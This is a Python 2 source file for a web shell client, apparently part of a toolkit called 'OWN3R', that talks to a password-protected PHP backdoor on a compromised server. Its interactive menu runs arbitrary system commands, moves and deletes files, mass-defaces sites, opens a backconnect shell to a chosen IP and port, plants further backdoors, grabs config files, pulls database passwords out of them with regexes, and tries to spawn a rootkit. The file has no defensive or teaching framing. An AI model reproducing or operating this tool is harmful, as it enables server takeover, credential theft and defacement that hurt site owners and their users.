import urllib, urllib2, requests
import sys,os
import re

sys.path.append(os.path.dirname(__file__) + "../core")

import options

class PHPOConnector:
    def __init__(self, hostname, ssl, password):
        try:
            self.prefix = "http://"
            if(ssl == "True"):
                self.prefix = "https://"
            self.host = str(self.prefix)+str(hostname)
            self.password = password
        except Exception as e:
            print "Failed to create object PHPOConnector : "+str(e)
    def options(self, option):
        try:
            if(option == "host"):
                return self.host
        except Exception as e:
            print "Failed to execute PHPOconnector.options() : "+str(e)
    def connect(self):
        try:
            checker = urllib2.urlopen(self.host+str("?initialize")).read()
            if("OWN3R:WELCOME;" in checker or "OWN3R:PASSWORD;" in checker):
                if("OWN3R:PASSWORD;" in checker):
                    pchecker = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)).read()
                    if("OWN3R:PASSWORD;" in pchecker):
                        print "[-] Failed to connect to remote host / Wrong password"
                        return False
                    else:
                        print "[+] Successfully connected to remote host."
                        return True
                else:
                    return True
            else:
                print "[-] Failed to connect to remote host."
                return False
            return False
        except urllib2.HTTPError, e:
            print "[-] Failed to connect to remote host / Not found"
            pass
        except Exception as e:
            print "Failed to execute PHPOconnector.connect() : "+str(e)
    def raiseShell(self, session):
        try:
            uname = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=system&argument=uname%20-a&method=system").read()
            if(uname != ""):
                print "[+] Successfully interacted with session #"+str(session)
                print uname
                current_working_dir = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=system&argument=pwd&method=system").read()
                while(True):
                    if(os.name != "nt"):
                        com = "\033[91mPHPOConnector\033[0m $ "
                    else:
                        com = "PHPOConnector $ "
                    command = raw_input(com)
                    if(command == "help"):
                        print '''
                            back - Exit interaction shell
                            cmd - Spawn a shell
                            dir:<path> - Change working directory
                            download:<file_name> - Download file from server
                            upload:<file_path>:<name> - Upload file to server
                            list - List all elements inside the current working directory
                            ls:<path> - List all elements inside a chosen path
                            rename:<old_name>:<new_name> - Rename file
                            remove:<file_name> - Remove file
                            deface:<deface_url>:<start_path> - Mass deface server
                            bc:<ip>:<port> - Start a backconnect connection
                            backdoor:<path> - Plant a backdoor in a defined path
                            config - Extract server's config files
                            passwords:<folder_url> - Extract passwords from config
                            autoroot - Spawn a rootkit inside the server ( only for Python 2.7 )
                        '''
                    elif(command == "back"):
                        break
                    elif(command == "cmd"):
                        while(True):
                            if(os.name != "nt"):
                                com2 = "\033[91mPHPOConnector SH\033[0m $ "
                            else:
                                com2 = "PHPOConnector SH$ "
                            method = "system"
                            command2 = raw_input(com2)
                            if(command2 == "exit"):
                                break
                            elif(command2 == "method:system;"):
                                method = "system"
                            elif(command2 == "method:passthru;"):
                                method = "passthru";
                            else:
                                commands = urllib.quote_plus(command2)
                                result = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=system&argument="+str(commands)+"&method="+str(method)).read()
                                if(result != ""):
                                    print result
                    elif(command == "list"):
                        working_dir = current_working_dir
                        lister = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=lister&argument="+str(working_dir)).read()
                        if(lister != "" and lister != "OWN3R:FAIL;"):
                            data = lister.split("|")
                            columns = []
                            for line in data:
                                try:
                                    line = line.split(",")
                                    columns.append(str(line[0]))
                                    columns.append(str(line[2]))
                                except:
                                    pass
                            options.table(["FILE NAME", "LAST MODIFIED"], columns)
                        else:
                            print "[-] File/Path is not reachable."
                    elif(command == "config"):
                        config_grabber = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=symlink").read()
                        print "[!] Done ! please check OWN3R directory for more information."
                    elif(command == "autoroot"):
                        autorooter = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=autoroot&argument="+str(current_working_dir)).read()
                        if("OWN3R:FAIL;" in autorooter):
                            print "[-] Could not spawn rootkit."
                        else:
                            print "[+] Rootkit spawned successfully [W00T.py] !"
                    elif(len(command.split(":")) > 1):
                        if(len(command.split(":")) == 2):
                            data = re.findall("(.*?):(.*?);", command)
                            cmd = data[0][0]
                            value = data[0][1]
                        else:
                            data = re.findall("(.*?):(.*?):(.*?);", command)
                            cmd = data[0][0]
                            value = data[0][1]
                            values = data[0][2]
                        if(cmd == "dir"):
                            checker = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=checkDir&argument="+str(value)).read()
                            if("OWN3R:FALSE;" in checker):
                                print "[-] Folder does'nt exist."
                            else:
                                print "[+] Current working directory changed to '"+str(value)+"'"
                                current_working_dir = value
                        elif(cmd == "download"):
                            file_path = str(current_working_dir)+str(value)
                            file_path = urllib.quote_plus(file_path)
                            file_data = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=downloadFile&argument="+str(file_path)).read()
                            if(file_data != "OWN3R:FALSE;"):
                                with open("Downloads/"+str(value), "a+") as f:
                                    f.write(file_data)
                                print "[+] Successfully downloaded ["+str(len(file_data))+"] Bytes"
                            else:
                                print "[-] Failed to download '"+str(file_path)+"' / No such file."
                        elif(cmd == "upload"):
                            target_file = urllib.quote_plus(str(current_working_dir)+str(values))
                            r = requests.post(self.host+str("?initialize&password=")+str(self.password)+"&cmd=uploadFiles&target="+str(target_file), files={'tfile': open(value, 'rb')})
                            if(r.text == "OWN3R:FAIL;"):
                                print "[-] Failed to upload file."
                            else:
                                print "[+] File uploaded successfully."
                        elif(cmd == "ls"):
                            working_dir = value
                            lister = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=lister&argument="+str(working_dir)).read()
                            if(lister != "" and lister != "OWN3R:FAIL;"):
                                data = lister.split("|")
                                columns = []
                                for line in data:
                                    try:
                                        line = line.split(",")
                                        columns.append(str(line[0]))
                                        columns.append(str(line[2]))
                                    except:
                                        pass
                                options.table(["FILE NAME", "LAST MODIFIED"], columns)
                            else:
                                print "[-] File/Path is not reachable."
                        elif(cmd == "rename"):
                            filename = value.replace(" ", "%20")
                            newfile = values.replace(" ", "%20")
                            worker = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=rename&argument="+str(filename)+"&argument2="+str(newfile)+"&argument3="+str(current_working_dir)).read()
                            if("OWN3R:FAIL;" in worker):
                                print "[-] Failed to rename file '"+str(filename)+"'"
                            else:
                                print "[+] Done ! '"+str(filename)+"' was renamed to '"+str(newfile)+"'"
                        elif(cmd == "remove"):
                            filename = value.replace(" ", "%20")
                            worker = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=remove&argument="+str(filename)+"&argument2="+str(current_working_dir)).read()
                            if("OWN3R:FAIL;" in worker):
                                print "[-] Failed to remove file '"+str(filename)+"'"
                            else:
                                print "[+] Done ! '"+str(filename)+"' was removed."
                        elif(cmd == "deface"):
                            defacer = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=deface&argument="+str(value)+"&argument2="+str(values)).read()
                            if(defacer == "OWN3R:FAIL;"):
                                print "[-] Defacing failed."
                        elif(cmd == "backdoor"):
                            spawner = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=backdoor&argument="+str(value)).read()
                            if(spawner == "OWN3R:FAIL;"):
                                print "[-] Spawning failed."
                            else:
                                print "[+] Spawning done, check [.config.php]."
                        elif(cmd == "bc"):
                            backconnector = urllib2.urlopen(self.host+str("?initialize&password=")+str(self.password)+"&cmd=backconnect&argument="+str(value)+"&argument2="+str(values)).read()
                            if("OWN3R:FAIL;" in backconnector):
                                print "[-] Failed to bind connection."
                        elif(cmd == "passwords"):
                            checker = urllib2.urlopen(self.prefix+value).read()
                            if("Index of" in checker):
                                passwords = []
                                files = re.findall('href="(.*?)"', checker)
                                print "+---------------+"
                                print "+   PASSWORDS   +"
                                print "+---------------+"
                                for f in files:
                                    try:
                                        text = urllib2.urlopen(self.prefix+value+"/"+f).read()
                                        checker1 = re.findall("'DB_PASSWORD', '(.*?)'", text)
                                        checker2 = re.findall("$password = '(.*?)';", text)
                                        checker3 = re.findall("'password' => '(.*?)'", text)
                                        checker4 = re.findall("$_['db_password']          = '(.*?)';", text)
                                        passwords.extend(checker1)
                                        passwords.extend(checker2)
                                        passwords.extend(checker3)
                                        passwords.extend(checker4)
                                    except:
                                        pass
                                for password in passwords:
                                    print password
                                print "+---------------+"
                            else:
                                print "[-] Failed to extract passwords."
                    else:
                        print "[-] There is no command called '"+str(command)+"'"
            else:
                print "[-] Interaction failed."
        except Exception as e:
            print "Failed to execute PHPOConnector.raiseShell() : "+str(e)
